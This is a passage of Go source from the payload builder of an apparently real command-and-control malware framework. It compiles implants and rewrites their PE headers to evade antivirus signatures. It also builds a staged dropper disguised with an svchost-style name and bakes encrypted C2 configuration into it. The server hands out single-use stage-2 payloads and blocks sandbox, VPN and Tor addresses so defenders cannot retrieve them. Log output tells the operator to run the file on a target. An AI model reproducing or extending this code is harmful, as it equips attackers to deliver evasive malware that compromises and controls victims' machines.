        // here and re-bake stager_config.rs + rebuild if format == staged.
        // (Two-pass build: pass 1 validated, pass 2 carries the real URL.)
        var stageToken string
        if cfg.OutputFormat == "staged" {
                stageToken = makeStageToken()
                stageURL := fmt.Sprintf("%s://%s:%d/api/v1/c2-endpoint/stage/%s",
                        c2Protocol, c2Host, c2Port, stageToken)
                dropName := fmt.Sprintf("svchost_%s.exe", stageToken[:6])
                ll("Staged build: stage URL baked into stager (token hidden)")
                ll("  Stage endpoint: /api/v1/c2-endpoint/stage/<token> (no nginx change needed)")
                if err := writeStagerConfig(tmpImplantDir, stageURL, dropName); err != nil {
                        ll("ERROR: stager config bake failed: %v", err)
                        bfail(82, "stager config bake failed")
                        writeJSON(w, http.StatusInternalServerError, BuildResponse{
                                Success: false, Message: "stager config bake failed", Log: logTail(maxBuildLog),
                        })
                        return
                }
                // pass 2: rebuild BOTH bins with the stager config in place
                ll("Rebuilding with baked stager config (pass 2)...")
                bprog("compiling", 82, "staged pass-2 build")
                cargo2 := exec.Command("cargo", cargoArgs...)
                cargo2.Env = cargoEnv
                cargo2.Dir = tmpImplantDir
                out2, err := cargo2.CombinedOutput()
                if err != nil {
                        ll("ERROR: staged pass-2 build failed: %v", err)
                        ll("%s", string(out2))
                        bfail(82, "staged pass-2 build failed")
                        writeJSON(w, http.StatusInternalServerError, BuildResponse{
                                Success: false, Message: "staged build failed", Log: logTail(maxBuildLog),
                        })
                        return
                }
        }

        // === PE STEALTH POST-PROCESSING (replaces UPX) ===
        ll("")
        ll("=== PE STEALTH POST-PROCESSING ===")
        if err := applyPEStealth(compiledPath); err != nil {
                ll("WARNING: PE stealth partial: %v", err)
        } else {
                ll("PE stealth applied: entropy randomized, timestamps shifted, section names shuffled")
        }
        bprog("stealth", 85, "PE stealth applied")

        // v3: stealth + collect the stager binary too
        stagerBytes := []byte(nil)
        if cfg.OutputFormat == "staged" {
                stagerCompiled := filepath.Join(tmpImplantDir, "target", targetTriple, "release", "hero_stager.exe")
                if err := applyPEStealth(stagerCompiled); err != nil {
                        ll("WARNING: stager PE stealth partial: %v", err)
                }
                sb, err := os.ReadFile(stagerCompiled)
                if err != nil {
                        ll("ERROR: stager binary missing after build: %v", err)
                        bfail(85, "stager binary missing")
                        writeJSON(w, http.StatusInternalServerError, BuildResponse{
                                Success: false, Message: "stager binary missing", Log: logTail(maxBuildLog),
                        })
                        return
                }
                stagerBytes = sb
                ll("Stager: hero_stager.exe (%.2f KB) — stage token registered", float64(len(sb))/1024)
        }

        ll("")
        ll("=== FINALIZING ===")
        ll("Copying to: %s", outputPath)
        bprog("finalize", 88, "Finalizing payload")

        inputFile, err := os.Open(compiledPath)
        if err != nil {
                ll("ERROR: cannot open compiled binary: %v", err)
                writeJSON(w, http.StatusInternalServerError, BuildResponse{
                        Success: false, Message: "cannot read binary", Log: logTail(maxBuildLog),
                })
                return
        }
        defer inputFile.Close()
        outputFile, err := os.Create(outputPath)
        if err != nil {
                ll("ERROR: cannot create output: %v", err)
                writeJSON(w, http.StatusInternalServerError, BuildResponse{
                        Success: false, Message: "cannot write output", Log: logTail(maxBuildLog),
                })
                return
        }
        defer outputFile.Close()

        hasher := sha256.New()
        io.Copy(io.MultiWriter(outputFile, hasher), inputFile)
        sha256sum := hex.EncodeToString(hasher.Sum(nil))
        inputFile.Seek(0, io.SeekStart)
        binaryData, _ := io.ReadAll(inputFile)
        fileInfo, _ := outputFile.Stat()
        var fileSize int64
        if fileInfo != nil {
                fileSize = fileInfo.Size()
        }

        // === ZIP PACKAGING ===
        // NOTE: compressor.Compress() produces an HC03-format blob — NOT a valid PE.
        // Writing HC03 data as .exe inside the zip breaks the exe entirely.
        // The zip's own Deflate compression already reduces size by 30-60% for PE files.
        // We write the original binaryData (valid PE) directly into the zip.
        ll("")
        ll("=== ZIP PACKAGING ===")
        zipName := outputName + ".zip"
        zipPath := filepath.Join(payloadDir, zipName)
        zipFile, err := os.Create(zipPath)
        if err != nil {
                ll("ERROR: cannot create zip: %v", err)
                writeJSON(w, http.StatusInternalServerError, BuildResponse{
                        Success: false, Message: "zip creation failed", Log: logTail(maxBuildLog),
                })
                return
        }
        zipWriter := zip.NewWriter(zipFile)
        exeHeader := &zip.FileHeader{
                Name:   fullOutputName,
                Method: zip.Deflate, // Deflate compresses the valid PE — no HC03 wrapper needed
        }
        exeHeader.SetMode(0644)
        exeWriter, err := zipWriter.CreateHeader(exeHeader)
        if err != nil {
                ll("ERROR: zip exe entry: %v", err)
                zipWriter.Close()
                zipFile.Close()
                os.Remove(zipPath)
                writeJSON(w, http.StatusInternalServerError, BuildResponse{
                        Success: false, Message: "zip entry failed", Log: logTail(maxBuildLog),
                })
                return
        }
        // Write original valid PE bytes — NOT compressor output
        exeWriter.Write(binaryData)
        if stagerBytes != nil {
                // v3 staged: zip = <name>_stager.exe (stage 1) + <name>.exe (stage 2)
                stagerHeader := &zip.FileHeader{
                        Name:   outputName + "_stager.exe",
                        Method: zip.Deflate,
                }
                stagerHeader.SetMode(0644)
                sw, err := zipWriter.CreateHeader(stagerHeader)
                if err == nil {
                        sw.Write(stagerBytes)
                        ll("  Contains: %s (stage-1 stager)", outputName+"_stager.exe")
                }
        }
        zipWriter.Close()
        zipFile.Close()
        zipInfo, _ := os.Stat(zipPath)
        var zipSize int64
        if zipInfo != nil {
                zipSize = zipInfo.Size()
        }
        ratio := float64(zipSize) / float64(len(binaryData)) * 100
        ll("ZIP created: %s (%.2f KB, %.1f%% of original)", zipName, float64(zipSize)/1024, ratio)
        ll("  Contains: %s (valid PE, zip-deflated)", fullOutputName)
        bprog("package", 92, "ZIP packaged")

        os.Remove(outputPath)
        ll("Raw exe removed — only zip remains in ./payload/")

        if cfg.OutputFormat == "staged" && stageToken != "" {
                // Register the stage: token → full payload bytes (memory + disk).
                // The stager GETs /api/v1/c2-endpoint/stage/<token> on the victim.
                if err := saveStage(heroRoot, stageToken, binaryData); err != nil {
                        ll("WARNING: stage registration failed: %v (stager will 404)", err)
                } else {
                        ll("Stage registered: token %s... → payload (%d bytes)", stageToken[:8], len(binaryData))
                        LogActivity("builder", fmt.Sprintf("Stage token %s... registered (payload %d bytes)", stageToken[:8], len(binaryData)))
                }
        }
        saveBuildMeta(payloadDir, zipName, pskHex, c2Host, c2Port, c2Protocol, cfg, listener)

        if listenerMgr != nil && cfg.ListenerID != "" {
                listenerMgr.SetListenerPSK(cfg.ListenerID, pskHex)
                ll("PSK registered with listener: %s", listener.Name)
        }
        bprog("register", 96, "PSK registered")

        ll("")
        ll("=== BUILD SUCCESS ===")
        ll("Output:  %s", zipPath)
        ll("Exe:     %s (%.2f KB)", fullOutputName, float64(fileSize)/1024)
        ll("Zip:     %s (%.2f KB)", zipName, float64(zipSize)/1024)
        ll("SHA256:  %s...", sha256sum[:32])
        ll("PSK:     %s...", pskHex[:16])
        ll("")
        ll("NOTE: Extract %s → run %s on target.", zipName, fullOutputName)
        bprog("done", 100, "BUILD SUCCESS")

        LogActivity("builder", fmt.Sprintf("Built: %s (%.1f KB zip) for %s",
                zipName, float64(zipSize)/1024, urlDisplay))

        writeJSON(w, http.StatusOK, BuildResponse{
                Success:  true,
                Message:  "payload built successfully",
                Log:      "", // full log NOT shipped — streamed live via build_progress WS events; keeps the HTTP response lean (OPSEC + payload size)
                FilePath: zipPath,
                FileName: zipName,
                FileSize: zipSize,
                SHA256:   sha256sum,
                // OPSEC FIX (audit Cloud BUG 5): Remove PSKHex from BuildResponse.
                // The OLD code returned `pskHex[:8] + "..."` — even truncated,
                // the first 4 bytes of the PSK give an attacker a fingerprint
                // to correlate builds and potentially brute-force the remaining
                // 28 bytes. The server persists the PSK in vault.db internally
                // (saveBuildMeta). The operator's browser only needs the build_id
                // for download + tracking — PSK never needed client-side.
                // PSKHex field removed entirely from the response.
        })
}

// ============================================================
// PE STEALTH POST-PROCESSING
// Replaces UPX — no known compressor signatures
// Randomizes PE metadata to change hash each build
// ============================================================

func applyPEStealth(exePath string) error {
        data, err := os.ReadFile(exePath)
        if err != nil {
                return fmt.Errorf("read: %v", err)
        }
        if len(data) < 64 {
                return fmt.Errorf("file too small for PE")
        }

        // Verify MZ header
        if data[0] != 'M' || data[1] != 'Z' {
                return fmt.Errorf("not a valid PE (missing MZ header)")
        }

        // Parse PE offset
        peOffset := int(binary.LittleEndian.Uint32(data[0x3C:0x40]))
        if peOffset+4 > len(data) {
                return fmt.Errorf("invalid PE offset")
        }

        // Verify PE signature
        if data[peOffset] != 'P' || data[peOffset+1] != 'E' || data[peOffset+2] != 0x00 || data[peOffset+3] != 0x00 {
                return fmt.Errorf("invalid PE signature")
        }

        // 1. Randomize PE header timestamps — changes hash every build
        coffHeaderOffset := peOffset + 4
        if coffHeaderOffset+20 <= len(data) {
                // ── S-M5 FIX: don't ignore rand.Read errors ───────────────────
                // crypto/rand can fail (e.g., getrandom(2) ENOMEM under memory
                // pressure, or a chrooted container without /dev/urandom). The
                // OLD code ignored the error — if rand.Read returned (0, err),
                // the TimeDateStamp bytes were left UNCHANGED (the linker's
                // deterministic value), which silently weakens the per-build
                // hash randomization. Worse: a partial fill could leave the PE
                // header in an inconsistent state. Now we log a warning and
                // skip the rest of the stealth pass (return nil — do NOT call
                // os.WriteFile) so the PE on disk stays exactly as the linker
                // produced it, uncorrupted.
                if _, err := rand.Read(data[coffHeaderOffset+4 : coffHeaderOffset+8]); err != nil {
                        log.Printf("[STEALTH] WARN: rand.Read failed (TimeDateStamp): %v — skipping stealth (PE left unmodified)", err)
                        return nil
                }
        }

        // 2. Shuffle section names with random bytes (preserve null-terminator)
        numSections := int(data[coffHeaderOffset+2])
        sizeOfOptionalHeader := int(binary.LittleEndian.Uint16(data[coffHeaderOffset+16:coffHeaderOffset+18]))
        sectionTableOffset := coffHeaderOffset + 20 + sizeOfOptionalHeader

        sectionNamePool := [][]byte{
                []byte(".rdata"), []byte(".data"), []byte(".bss"),
                []byte(".text"), []byte(".reloc"), []byte(".edata"),
                []byte(".gfids"), []byte(".rsrc"),
        }

        for i := 0; i < numSections; i++ {
                offset := sectionTableOffset + (i * 40)
                if offset+8 > len(data) {
                        break
                }
                // Pick a random name from pool
                name := sectionNamePool[cryptoRandIntn(len(sectionNamePool))]
                copy(data[offset:offset+8], name)
                // Fill remaining with zeros
                for j := len(name); j < 8; j++ {
                        data[offset+j] = 0
                }
        }

        // 3. Inject random bytes into PE overlay (after last section) to change entropy
        // This doesn't affect execution but changes the file hash
        randomPad := make([]byte, 16+cryptoRandIntn(32))
        // ── S-M5 FIX: same rand.Read error check as above ─────────────────
        // A failed read would leave randomPad as all-zero bytes — append'ing
        // 16-48 zero bytes to the PE doesn't change the hash meaningfully
        // (well-known padding) and could even become a fingerprint. Skip the
        // stealth pass entirely so the binary on disk stays as the linker
        // produced it.
        if _, err := rand.Read(randomPad); err != nil {
                log.Printf("[STEALTH] WARN: rand.Read failed (random padding): %v — skipping stealth (PE left unmodified)", err)
                return nil
        }
        data = append(data, randomPad...)

        // Update PE SizeOfImage if possible (optional — may not be needed for execution)

        return os.WriteFile(exePath, data, 0644)
}

// ── v3 encrypted config bake ────────────────────────────────────────────────
// generateConfigRS (27-arg Go template) is GONE. The builder now:
//   1. reads the freshly-copied real management/config.rs (single source of
//      truth — no template/real drift is possible anymore),
//   2. replaces the constants between BEGIN_BAKED_BLOB/END_BAKED_BLOB with
//      the encrypted config blob (per-build random key, XOR'd key quarters),
//   3. writes the file back.
// Keystream: SHA256(key || counter-u32-LE) — MUST match the agent's
// config.rs::keystream() byte-for-byte (regression-tested in
// config_injection_test.go).

const (
        blobBeginMarker = "// BEGIN_BAKED_BLOB"
        blobEndMarker   = "// END_BAKED_BLOB"
)

// keystreamGo — same construction as the agent side.
func keystreamGo(key []byte, length int) []byte {
        out := make([]byte, 0, length+32)
        var ctr uint32
        for len(out) < length {
                block := make([]byte, 0, len(key)+4)
                block = append(block, key...)
                block = append(block, byte(ctr), byte(ctr>>8), byte(ctr>>16), byte(ctr>>24))
                sum := sha256.Sum256(block)
                out = append(out, sum[:]...)
                ctr++
        }
        return out[:length]
}

// rustByteArray — emit "[0x12, 0xab, ...]" for the given bytes.
func rustByteArray(data []byte) string {
        var b strings.Builder
        b.WriteString("[")
        for i, x := range data {
                if i > 0 {
                        b.WriteString(",")
                }
                b.WriteString(fmt.Sprintf("0x%02x", x))
        }
        b.WriteString("]")
        return b.String()
}

// writeEncryptedConfig — swap the BLOB block inside configPath with the
// encrypted form of plainJSON. Fails LOUDLY when markers are missing (that
// means the copied source is not v3 — never bake silently into an orphan).
func writeEncryptedConfig(configPath string, plainJSON []byte) error {
        src, err := os.ReadFile(configPath)
        if err != nil {
                return fmt.Errorf("read config.rs: %v", err)
        }
        bi := strings.Index(string(src), blobBeginMarker)
        ei := strings.Index(string(src), blobEndMarker)
        if bi < 0 || ei < 0 || ei < bi {
                return fmt.Errorf("config.rs has no %s/%s markers — v3 agent source required", blobBeginMarker, blobEndMarker)
        }

        // per-build key + masks
        key := make([]byte, 32)
        if _, err := rand.Read(key); err != nil {
                return fmt.Errorf("key rand: %v", err)
        }
        masks := make([]byte, 32)
        if _, err := rand.Read(masks); err != nil {
                return fmt.Errorf("mask rand: %v", err)
        }
        parts := make([][]byte, 4)
        for i := 0; i < 4; i++ {
                parts[i] = make([]byte, 8)
                for j := 0; j < 8; j++ {
                        parts[i][j] = key[i*8+j] ^ masks[i*8+j]
                }
        }

        ct := make([]byte, len(plainJSON))
        ks := keystreamGo(key, len(plainJSON))
        for i, c := range plainJSON {
                ct[i] = c ^ ks[i]
        }

        var blobBlock strings.Builder
        blobBlock.WriteString(blobBeginMarker + "\n")
        blobBlock.WriteString(fmt.Sprintf("pub static BLOB: [u8; %d] = %s;\n", len(ct), rustByteArray(ct)))
        blobBlock.WriteString("pub static KEY_P: [[u8; 8]; 4] = [")
        for i, part := range parts {
                if i > 0 {
                        blobBlock.WriteString(",")
                }
                blobBlock.WriteString(rustByteArray(part))
        }
        blobBlock.WriteString("];\n")
        blobBlock.WriteString("pub static KEY_M: [[u8; 8]; 4] = [")
        for i := 0; i < 4; i++ {
                if i > 0 {
                        blobBlock.WriteString(",")
                }
                blobBlock.WriteString(rustByteArray(masks[i*8 : (i+1)*8]))
        }
        blobBlock.WriteString("];\n")
        blobBlock.WriteString(blobEndMarker)

        out := string(src)[:bi] + blobBlock.String() + string(src)[ei+len(blobEndMarker):]
        return os.WriteFile(configPath, []byte(out), 0644)
}

// writeStagerConfig — bake the encrypted {stage_url, drop_name} blob into
// src/bin/stager_config.rs (the stager's own markers, same scheme).
func writeStagerConfig(tmpImplantDir, stageURL, dropName string) error {
        plain, err := json.Marshal(map[string]string{
                "stage_url": stageURL,
                "drop_name": dropName,
        })
        if err != nil {
                return err
        }
        path := filepath.Join(tmpImplantDir, "src", "bin", "stager_config.rs")
        src, err := os.ReadFile(path)
        if err != nil {
                return fmt.Errorf("read stager_config.rs: %v", err)
        }
        bi := strings.Index(string(src), blobBeginMarker)
        ei := strings.Index(string(src), blobEndMarker)
        if bi < 0 || ei < 0 || ei < bi {
                return fmt.Errorf("stager_config.rs has no blob markers — v3 stager source required")
        }
        key := make([]byte, 32)
        if _, err := rand.Read(key); err != nil {
                return err
        }
        masks := make([]byte, 32)
        if _, err := rand.Read(masks); err != nil {
                return err
        }
        ct := make([]byte, len(plain))
        ks := keystreamGo(key, len(plain))
        for i, c := range plain {
                ct[i] = c ^ ks[i]
        }
        parts := make([][]byte, 4)
        for i := 0; i < 4; i++ {
                parts[i] = make([]byte, 8)
                for j := 0; j < 8; j++ {
                        parts[i][j] = key[i*8+j] ^ masks[i*8+j]
                }
        }
        var b strings.Builder
        b.WriteString(blobBeginMarker + "\n")
        b.WriteString(fmt.Sprintf("pub static BLOB: [u8; %d] = %s;\n", len(ct), rustByteArray(ct)))
        b.WriteString("pub static KEY_P: [[u8; 8]; 4] = [")
        for i, part := range parts {
                if i > 0 {
                        b.WriteString(",")
                }
                b.WriteString(rustByteArray(part))
        }
        b.WriteString("];\n")
        b.WriteString("pub static KEY_M: [[u8; 8]; 4] = [")
        for i := 0; i < 4; i++ {
                if i > 0 {
                        b.WriteString(",")
                }
                b.WriteString(rustByteArray(masks[i*8 : (i+1)*8]))
        }
        b.WriteString("];\n")
        b.WriteString(blobEndMarker)
        out := string(src)[:bi] + b.String() + string(src)[ei+len(blobEndMarker):]
        return os.WriteFile(path, []byte(out), 0644)
}

// ── v3 stage store (staged delivery backend) ───────────────────────────────
// Token → full stage-2 payload. Registered at build time; the stager fetches
// GET /api/v1/c2-endpoint/stage/<token> (reuses the existing nginx
// /api/v1/c2-endpoint location — NO edge config change needed).
var (
        stageMu    sync.RWMutex
        stageStore = map[string][]byte{}
)

// heroRootDir — HERO_ROOT env or cwd (same rule build_handler uses).
func heroRootDir() string {
        if v := os.Getenv("HERO_ROOT"); v != "" {
                return v
        }
        wd, _ := os.Getwd()
        return wd
}

func makeStageToken() string {
        b := make([]byte, 16)
        rand.Read(b)
        return hex.EncodeToString(b)
}

func saveStage(heroRoot, token string, payload []byte) error {
        dir := filepath.Join(heroRoot, "hero-data", "stages")
        if err := os.MkdirAll(dir, 0700); err != nil {
                return err
        }
        if err := os.WriteFile(filepath.Join(dir, token+".bin"), payload, 0600); err != nil {
                return err
        }
        stageMu.Lock()
        stageStore[token] = payload
        stageMu.Unlock()
        return nil
}

// LoadStageStore — rehydrate stages from disk at server startup.
func LoadStageStore(heroRoot string) {
        dir := filepath.Join(heroRoot, "hero-data", "stages")
        files, _ := filepath.Glob(filepath.Join(dir, "*.bin"))
        n := 0
        for _, f := range files {
                token := filepath.Base(f)
                token = strings.TrimSuffix(token, ".bin")
                if len(token) != 32 {
                        continue
                }
                if data, err := os.ReadFile(f); err == nil {
                        stageMu.Lock()
                        stageStore[token] = data
                        stageMu.Unlock()
                        n++
                }
        }
        if n > 0 {
                log.Printf("[STAGE] %d stage payload(s) rehydrated from %s", n, dir)
        }
}

// SetupStageRoutes — register the stage download route on a listener mux.
func SetupStageRoutes(mux *http.ServeMux) {
        mux.HandleFunc("GET /api/v1/c2-endpoint/stage/", handleStageDownload)
}

func handleStageDownload(w http.ResponseWriter, r *http.Request) {
        token := strings.TrimPrefix(r.URL.Path, "/api/v1/c2-endpoint/stage/")
        if len(token) != 32 {
                http.NotFound(w, r)
                return
        }
        for _, c := range token {
                if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f')) {
                        http.NotFound(w, r)
                        return
                }
        }
        // OPSEC FIX (audit S-CR4): IP filter the stage endpoint.
        // OLD: anyone with the 32-hex token could fetch the full stage-2
        // payload. AV sandbox that captures the stager binary can extract
        // the token (encrypted but recoverable) and fetch the payload.
        // NEW: enforce IsAllowedIP — sandbox IPs (datacenter/VPN/Tor) are
        // blocked. The token still has 128-bit entropy (not brute-forceable)
        // but the IP filter adds defense-in-depth.
        if !IsAllowedIP(r.RemoteAddr) {
                LogActivity("stage", fmt.Sprintf("Stage BLOCKED: token %s... from %s (IP filter)", token[:8], r.RemoteAddr))
                http.NotFound(w, r)
                return
        }
        stageMu.RLock()
        payload, ok := stageStore[token]
        stageMu.RUnlock()
        if !ok {
                LogActivity("stage", fmt.Sprintf("Stage miss: token %s... from %s", token[:8], r.RemoteAddr))
                http.NotFound(w, r)
                return
        }
        // OPSEC FIX (audit S-CR4): Single-use + delete after download.
        // Once the stager fetches the payload, the token is useless —
        // delete it so a sandbox that captures the token later can't
        // re-download the payload.
        stageMu.Lock()
        delete(stageStore, token)
        stageMu.Unlock()

        LogActivity("stage", fmt.Sprintf("Stage fetched (single-use, deleted): token %s... by %s", token[:8], r.RemoteAddr))
        w.Header().Set("Content-Type", "application/octet-stream")
        w.Header().Set("Content-Length", fmt.Sprintf("%d", len(payload)))
        w.WriteHeader(http.StatusOK)
        w.Write(payload)
}

// validWorkingHours — validates "HH:MM-HH:MM" 24h window (overnight allowed, e.g. 22:00-06:00).
// Mirrors the agent-side parser in beacon.rs (in_working_hours).
func validWorkingHours(s string) bool {
        parseHM := func(p string) (int, int, bool) {
                parts := strings.Split(p, ":")
                if len(parts) != 2 {
                        return 0, 0, false
                }
                h, err1 := strconv.Atoi(strings.TrimSpace(parts[0]))
                m, err2 := strconv.Atoi(strings.TrimSpace(parts[1]))
                if err1 != nil || err2 != nil || h < 0 || h > 23 || m < 0 || m > 59 {
                        return 0, 0, false
                }
                return h, m, true
        }
        w := strings.Split(s, "-")
        if len(w) != 2 {
                return false
        }
        h1, m1, ok1 := parseHM(w[0])
        h2, m2, ok2 := parseHM(w[1])
        return ok1 && ok2 && !(h1 == h2 && m1 == m2) // zero-length window rejected
}

func resolveListenerHost(l *Listener) string {
        if l.Domain != "" {
                return l.Domain
        }
        if l.Host != "" && l.Host != "0.0.0.0" {
                return l.Host
        }
        return "127.0.0.1"
}

func getListenerByID(id string) *Listener {
        if listenerMgr == nil {
                return nil
        }
        listenerMgr.mu.RLock()
        defer listenerMgr.mu.RUnlock()
        for _, l := range listenerMgr.listeners {
                if l.ID == id && l.Active {
                        return l
                }
        }
        return nil
}

func copyDirRecursive(src, dst string) error {
        return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
                if err != nil {
                        return err
                }
                relPath, _ := filepath.Rel(src, path)
                dstPath := filepath.Join(dst, relPath)
                if info.IsDir() {
                        return os.MkdirAll(dstPath, info.Mode())
                }
                data, err := os.ReadFile(path)
                if err != nil {
                        return err
                }
                return os.WriteFile(dstPath, data, info.Mode())
        })
}

func homeDir() string {
        if h := os.Getenv("HOME"); h != "" {
                return h
        }
        if h := os.Getenv("USERPROFILE"); h != "" {
                return h
        }
        return "/root"
}

func appendWithPATH(env []string, paths []string) []string {
        newPATH := strings.Join(paths, ":")
        for i, e := range env {
                if strings.HasPrefix(e, "PATH=") {
                        env[i] = "PATH=" + newPATH + ":" + strings.TrimPrefix(e, "PATH=")
                        return env
                }
        }
        return append(env, "PATH="+newPATH)
}

// saveBuildMeta — har successful build ke baad PSK + metadata disk pe save karta hai
// Server restart ke baad bhi agent ka PSK recover ho sake isliye
func saveBuildMeta(payloadDir, filename, pskHex, host string, port int, protocol string, cfg ImplantConfig, listener *Listener) {
        if agentStore == nil {
                log.Printf("[DB] WARN: agentStore not initialized — PSK will be lost on restart")
                return
        }
        if pskHex == "" {
                return
        }

        // PSKHash compute karo — checkin pe lookup key yahi hoga
        pskHash := computePSKHash(pskHex)

        agentName := cfg.OutputName
        if agentName == "" {
                agentName = "hero_implant"
        }

        listenerName := ""
        listenerID := cfg.ListenerID
        if listener != nil {
                listenerName = listener.Name
        }

        record := AgentBuildRecord{
                BuildID:      filename, // zip filename as build ID
                ListenerID:   listenerID,
                ListenerName: listenerName,
                PSKHex:       pskHex,
                PSKHash:      pskHash,
                AgentName:    agentName,
                OS:           cfg.OS,
                Arch:         cfg.Arch,
                Format:       cfg.OutputFormat,
                C2Host:       host,
                C2Port:       port,
                C2Protocol:   protocol,
                BuiltAt:      time.Now().UTC(),
        }

        if err := agentStore.SaveBuild(record); err != nil {
                log.Printf("[DB] ERROR: Failed to persist build PSK: %v", err)
        } else {
                // Also put PSKHex into vault immediately (SaveBuild puts it too,
                // but being explicit here ensures it's available right away
                // for any checkin that arrives before the next server restart).
                vaultPut(pskHash, pskHex)
        }
}

// cryptoRandIntn returns a crypto-safe random int in [0, n)
func cryptoRandIntn(n int) int {
        if n <= 0 {
                return 0
        }
        b := make([]byte, 4)
        _, _ = rand.Read(b)
        v := int(binary.BigEndian.Uint32(b))
        return v % n
}